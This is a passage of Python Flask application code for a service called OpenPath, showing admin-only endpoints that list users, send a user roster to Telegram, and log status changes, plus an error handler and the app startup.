        "INSERT INTO audit_logs(actor_id,action,entity_type,entity_id,created_at) VALUES (?,?,?,?,?)",
        (g.user["id"], "user_status_changed", "user", user_id, utc_now()),
    )
    return jsonify({"message": "User status updated"})


@app.route("/api/telegram/users", methods=["GET"])
@role_required("admin")
def send_users_to_telegram():
    users = query("SELECT full_name,email,role,is_active,created_at FROM users ORDER BY created_at")
    lines = ["<b>OpenPath users</b>"]
    lines.extend(
        f"{index}. {user['full_name']} | {user['email']} | {user['role']}"
        for index, user in enumerate(users, 1)
    )
    sent = send_telegram_message("\n".join(lines))
    return jsonify(
        {
            "message": (
                "Telegram update sent" if sent else "Telegram not configured or request failed"
            ),
            "telegram_sent": sent,
        }
    )


@app.route("/api/users", methods=["GET"])
@role_required("admin")
def get_users():
    return jsonify(
        [
            dict(user)
            for user in query(
                "SELECT id,full_name,email,role,is_active,created_at FROM users ORDER BY created_at DESC"
            )
        ]
    )


@app.errorhandler(413)
def too_large(_error):
    return jsonify({"error": "Uploaded file is too large"}), 413


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
